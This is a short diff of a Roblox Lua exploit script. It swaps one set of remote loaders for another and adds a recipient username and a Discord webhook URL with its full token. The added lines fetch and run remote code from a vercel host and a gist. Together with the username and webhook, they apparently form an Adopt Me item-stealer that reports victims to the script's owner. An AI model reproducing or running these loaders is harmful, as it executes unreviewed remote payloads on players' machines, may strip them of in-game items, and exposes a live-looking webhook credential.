@@ -1,5 +1,8 @@
-getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/3d46538c8ff87e5ad632eae1.lua", true))()
+Username = "TFOX2130"
+Webhook = "https://discord.com/api/webhooks/1275039490221674527/BRL0-vfDyutAOq9KiIw7FV7xl45bnNUx3WDT-jcRGq0Li6zHXhn_4Bif_zBX4K3x38rz"
 
-_G.scriptName = "Teluk"
-loadstring(game:HttpGet("https://gist.githubusercontent.com/YoshikoScript/8e00b4b939e05126cd2ce7a26e25d16b/raw/d2607cb8cbde91ab44c44bff33f2e9ca00d7656f/Teluk"))()
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://projects-k4f7-scripts.vercel.app/adopt-me.lua",true))()
+
+loadstring(game:HttpGet("https://gist.githubusercontent.com/XScriptsOfficial/fa738a6fadda796f176a69c1082603a1/raw/8a81affcc0f0050be06871247e0d026481b6a1ed/XLoading"))()
